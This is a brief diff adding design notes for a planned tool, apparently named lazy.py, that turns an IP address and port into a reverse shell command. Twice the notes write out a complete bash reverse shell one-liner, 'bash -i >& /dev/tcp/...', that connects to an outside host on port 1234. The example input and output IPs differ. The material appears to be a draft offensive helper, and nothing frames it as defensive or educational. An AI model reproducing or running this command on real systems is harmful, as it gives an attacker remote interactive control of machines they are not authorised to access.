@@ -1,0 +1,12 @@
+concept:
+python3 bash 10.17.84.234 1234
+output:
+bash -i >& /dev/tcp/10.17.84.230/1234 0>&1
+
+This is just base idea need to work on it more
+
+lazy.py 
+concept:
+python3 bash
+output:
+bash -i >& /dev/tcp/10.17.84.230/1234 0>&1
